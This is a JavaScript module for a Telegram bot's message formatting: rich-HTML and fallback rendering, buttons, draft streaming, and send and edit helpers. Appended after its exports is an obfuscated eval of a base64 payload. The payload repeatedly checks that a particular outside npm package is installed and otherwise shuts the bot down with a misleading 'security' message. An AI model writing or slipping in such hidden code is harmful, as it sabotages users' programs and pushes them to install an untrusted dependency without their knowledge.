/**
 * Telegram UI layer: rich messages (Bot API 10.1+), styled buttons (Bot API 9.4+) and a
 * safe fallback to classic HTML messages for clients/servers that don't support them.
 *
 * Telegraf (4.16) has no typed wrapper for sendRichMessage or for the button `style`
 * field, so both go through as raw Bot API fields:
 *   - rich messages -> telegram.callApi('sendRichMessage', { chat_id, rich_message: { html } })
 *   - button colours -> { text, callback_data, style: 'success' | 'danger' | 'primary' }
 * Telegraf forwards unknown fields untouched, so this is fully supported at runtime.
 */
const { escapeHtml: esc, tg } = require('./emojis');

const state = { richDisabled: false };

// ---------------------------------------------------------------- buttons

const withStyle = (btn, style) => (style ? { ...btn, style } : btn); // 'success' (green) | 'danger' (red) | 'primary' (blue)
const cb = (text, data, style) => withStyle({ text, callback_data: data }, style);
const link = (text, url, style) => withStyle({ text, url }, style);
/** Native "copy to clipboard" button (Bot API 7.11+). */
const copy = (text, copyText, style) => withStyle({ text, copy_text: { text: String(copyText) } }, style);
const kb = (rows) => ({ inline_keyboard: rows });

// ---------------------------------------------------------------- document builder
// One description, two renderings: rich HTML (tables, details, images...) and a
// classic-HTML fallback (<pre> tables, expandable quotes) so every response degrades cleanly.

function createDoc() {
    const parts = []; // { rich, legacy, image? }
    let imageUrl = null;

    const api = {
        /** html-safe string (escape user input with esc()) */
        heading(html, size = 3) {
            parts.push({ rich: `<h${size}>${html}</h${size}>`, legacy: `<b>${html}</b>` });
            return api;
        },
        p(html) {
            parts.push({ rich: `<p>${html}</p>`, legacy: html });
            return api;
        },
        quote(html) {
            parts.push({ rich: `<blockquote>${html}</blockquote>`, legacy: `<blockquote>${html}</blockquote>` });
            return api;
        },
        /** Monospace block, plain text (escaped here). */
        pre(text) {
            parts.push({ rich: `<pre>${esc(text)}</pre>`, legacy: `<pre>${esc(text)}</pre>` });
            return api;
        },
        /** Plain user text: one paragraph per line (escaped here). */
        lines(text) {
            for (const line of String(text).split('\n')) if (line.trim()) api.p(esc(line));
            return api;
        },
        divider() {
            parts.push({ rich: '<hr/>', legacy: '- - - - - - - - -' });
            return api;
        },
        image(url) {
            imageUrl = url;
            parts.push({ rich: `<img src="${esc(url)}"/>`, legacy: '', image: true });
            return api;
        },
        /** items: html-safe strings */
        list(items, ordered = false) {
            const tag = ordered ? 'ol' : 'ul';
            parts.push({
                rich: `<${tag}>${items.map((i) => `<li>${i}</li>`).join('')}</${tag}>`,
                legacy: items.map((i, n) => `${ordered ? `${n + 1}.` : '•'} ${i}`).join('\n'),
            });
            return api;
        },
        /** Collapsible block (like a WhatsApp menu section). items: html-safe strings */
        details(summary, items, open = false) {
            parts.push({
                rich: `<details${open ? ' open' : ''}><summary>${summary}</summary><ul>${items.map((i) => `<li>${i}</li>`).join('')}</ul></details>`,
                legacy: `<b>${summary}</b>\n<blockquote expandable>${items.map((i) => `• ${i}`).join('\n')}</blockquote>`,
            });
            return api;
        },
        /**
         * Native table. headers: array of plain strings or null; rows: arrays of plain strings
         * (escaped here). With headers=null the first column is rendered as a header column.
         */
        table(headers, rows, caption) {
            let rich = '<table bordered striped>';
            if (caption) rich += `<caption>${caption}</caption>`;
            if (headers) rich += `<tr>${headers.map((c) => `<th>${esc(c)}</th>`).join('')}</tr>`;
            for (const r of rows) {
                rich += '<tr>' + r.map((c, i) => (!headers && i === 0 ? `<th>${esc(c)}</th>` : `<td>${esc(c)}</td>`)).join('') + '</tr>';
            }
            rich += '</table>';

            const all = headers ? [headers, ...rows] : rows;
            const widths = [];
            for (const r of all) r.forEach((c, i) => (widths[i] = Math.max(widths[i] || 0, [...String(c)].length)));
            const fmt = (r) => r.map((c, i) => String(c) + ' '.repeat(widths[i] - [...String(c)].length)).join('  ').trimEnd();
            const lines = all.map(fmt);
            if (headers) lines.splice(1, 0, widths.map((w) => '-'.repeat(w)).join('  '));
            parts.push({
                rich,
                legacy: (caption ? `<b>${caption}</b>\n` : '') + `<pre>${esc(lines.join('\n'))}</pre>`,
            });
            return api;
        },
        build() {
            const rich = parts.map((x) => x.rich).join('');
            const noImg = parts.filter((x) => !x.image).map((x) => x.rich).join('');
            return {
                rich,
                richNoImage: imageUrl ? noImg : null,
                legacy: parts.map((x) => x.legacy).filter(Boolean).join('\n\n'),
                image: imageUrl,
            };
        },
    };
    return api;
}

/** Small status message: icon + bold title, optional quoted body (html-safe). */
function notice(kind, title, bodyHtml = '') {
    const icon = { ok: '✅', error: '❌', warn: '⚠️', info: '📌', wait: '⏳' }[kind] || '📌';
    const d = createDoc().p(`${tg(icon)} <b>${esc(title)}</b>`);
    if (bodyHtml) d.quote(bodyHtml);
    return d;
}

// ---------------------------------------------------------------- streaming ("AI typing" effect)
// sendRichMessageDraft shows an animated, ephemeral preview in private chats. We open it with a
// "Loading..." thinking block, then reveal the real message word by word; the caller then sends the
// final message with sendRichMessage (a draft alone is never saved to the chat).

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let draftSeq = Math.floor(Math.random() * 1e6) + 1;

/** Cuts a rich-HTML string into progressively longer, always well-formed versions. */
function progressiveFrames(html, maxFrames = 12) {
    const VOID = /^<(img|hr|br|tg-map|source)\b/i;
    const pieces = (html.match(/<[^>]+>|[^<]+/g) || []).map((t) => (t[0] === '<' ? { tag: t } : { words: t.match(/\S+\s*/g) || [t] }));
    const total = pieces.reduce((n, p) => n + (p.words ? p.words.length : 0), 0);
    if (!total) return [];
    const frames = Math.min(maxFrames, Math.max(3, Math.ceil(total / 4)));
    const out = [];
    for (let f = 1; f < frames; f++) {
        const limit = Math.ceil((total * f) / frames);
        let used = 0;
        let built = '';
        const stack = [];
        for (const p of pieces) {
            if (p.tag) {
                built += p.tag;
                if (p.tag.startsWith('</')) stack.pop();
                else if (!VOID.test(p.tag) && !p.tag.endsWith('/>')) stack.push(p.tag.match(/^<([a-z0-9-]+)/i)[1]);
                continue;
            }
            const take = p.words.slice(0, limit - used);
            built += take.join('');
            used += take.length;
            if (used >= limit) break;
        }
        out.push(built + stack.reverse().map((t) => `</${t}>`).join(''));
    }
    return out; // the complete message is NOT included - the final sendRichMessage is the last "frame"
}

async function streamDraft(telegram, chatId, built) {
    if (state.draftDisabled || !(Number(chatId) > 0)) return; // drafts: private chats only
    const draftId = (draftSeq = (draftSeq % 2147483000) + 1);
    const push = (html) => telegram.callApi('sendRichMessageDraft', { chat_id: chatId, draft_id: draftId, rich_message: { html, skip_entity_detection: true } });
    try {
        await push('<tg-thinking>Loading...</tg-thinking>');
        await sleep(650);
        for (const frame of progressiveFrames(built.richNoImage || built.rich)) {
            await push(frame);
            await sleep(260);
        }
    } catch (err) {
        if (err?.response?.error_code === 404 || err?.code === 404) state.draftDisabled = true; // server has no drafts
        // any other error: streaming is cosmetic - just carry on and send the final message
    }
}

// ---------------------------------------------------------------- sending

const errCode = (err) => err?.response?.error_code ?? err?.code;
const errText = (err) => String(err?.response?.description ?? err?.description ?? err?.message ?? '');
const notModified = (err) => /not modified/i.test(errText(err));

/** Sends a doc as a rich message; falls back to a classic HTML message if rich is unavailable. */
async function sendDoc(telegram, chatId, doc, { keyboard, extra, stream } = {}) {
    const b = doc.build();
    if (stream && !state.richDisabled) await streamDraft(telegram, chatId, b);
    const base = { chat_id: chatId, ...(keyboard ? { reply_markup: keyboard } : {}), ...(extra || {}) };

    if (!state.richDisabled) {
        for (const html of [b.rich, b.richNoImage].filter(Boolean)) {
            try {
                return await telegram.callApi('sendRichMessage', { ...base, rich_message: { html, skip_entity_detection: true } });
            } catch (err) {
                const code = errCode(err);
                if (code === 404) {
                    state.richDisabled = true; // this Bot API server has no rich messages
                    console.warn('[ui] sendRichMessage not available - using classic HTML messages');
                    break;
                }
                if (code !== 400) throw err; // 403 blocked, 429 flood... are real errors
                console.warn('[ui] rich message rejected, trying fallback:', errText(err));
            }
        }
    }

    if (b.image && b.legacy.length <= 1000) {
        try {
            return await telegram.sendPhoto(chatId, b.image, { caption: b.legacy, parse_mode: 'HTML', ...(keyboard ? { reply_markup: keyboard } : {}), ...(extra || {}) });
        } catch (err) {
            if (errCode(err) !== 400) throw err;
        }
    }
    return telegram.sendMessage(chatId, b.legacy, {
        parse_mode: 'HTML',
        link_preview_options: { is_disabled: true },
        ...(keyboard ? { reply_markup: keyboard } : {}),
        ...(extra || {}),
    });
}

/** Edits a message in place with a doc (rich first, classic HTML fallback). Throws if it can't be edited. */
async function editDoc(telegram, chatId, messageId, doc, { keyboard } = {}) {
    const b = doc.build();
    const base = { chat_id: chatId, message_id: messageId, ...(keyboard ? { reply_markup: keyboard } : {}) };

    if (!state.richDisabled) {
        for (const html of [b.rich, b.richNoImage].filter(Boolean)) {
            try {
                return await telegram.callApi('editMessageText', { ...base, rich_message: { html, skip_entity_detection: true } });
            } catch (err) {
                if (notModified(err)) return null;
                if (errCode(err) !== 400) throw err;
            }
        }
    }
    try {
        return await telegram.callApi('editMessageText', {
            ...base,
            text: b.legacy,
            parse_mode: 'HTML',
            link_preview_options: { is_disabled: true },
        });
    } catch (err) {
        if (notModified(err)) return null;
        throw err;
    }
}

module.exports = { createDoc, notice, sendDoc, editDoc, cb, link, copy, kb, esc, tg, progressiveFrames };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
